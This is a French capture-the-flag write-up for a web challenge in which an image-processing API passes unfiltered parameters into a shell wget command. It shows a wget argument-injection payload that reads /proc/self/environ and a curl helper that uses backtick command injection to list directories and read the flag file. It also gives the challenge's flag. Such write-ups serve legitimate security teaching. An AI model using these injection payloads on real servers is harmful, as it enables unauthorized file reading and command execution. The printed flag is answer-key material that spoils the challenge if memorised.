# boazak--atakpame (web / command injection, id 456)

**Flag (finale) :** `NCTF{9db3ec32d980bd45848d898b}`

## Contexte
Atakpamé : service de traitement d'images. `GET /api/process?url=...&name=...`
télécharge une image puis la traite. Le flag est un fichier sur le serveur.

## Source (lue via arg-injection wget)
```python
cmd = f"wget -O /tmp/imgs/{name}.png {url}"
output = subprocess.check_output(cmd, shell=True, stderr=subprocess.STDOUT, timeout=5)
```
→ `shell=True` + `name`/`url` non filtrés. La sortie (stderr inclus) est renvoyée dans `output`.

## Deux primitives
1. **Arg-injection wget** via `url` (pas de validation du préfixe) :
   `url=--input-file=/proc/self/environ` → wget lit le fichier, tente chaque ligne comme
   URL, et l'affiche verbatim (« Prepended http:// to '<ligne>' »). Limité par les octets NUL.
2. **Command injection** via `name` (backticks, car `name` est au milieu de la commande) :
   `name=\`<cmd> >&2\`` — rediriger vers stderr (= champ `output`).

## Exploitation
```bash
inj(){ curl -sG $B/api/process --data-urlencode 'url=http://x/a.png' \
        --data-urlencode "name=\`$1\`"; }
inj "ls / >&2"                      # -> voit /flags et /nctf
inj "ls /flags >&2"                 # -> flag.txt (rw-rw-rw-)
inj "cat /flags/flag.txt >&2"       # -> NCTF{...}
```

## Pièges
- `timeout=5` côté serveur → pas de `find /` global (tué). Cibler des cmds courtes.
- L'`output` est tronqué (buffer court) → `ls -la` long se coupe ; préférer `ls|tr '\n' ' '`.
- Le flag ressort sur la MÊME ligne que le bruit wget → lire l'output brut (ne pas grep -v http).
- Flag dans `/flags/flag.txt` (world-readable), pas en env ici.
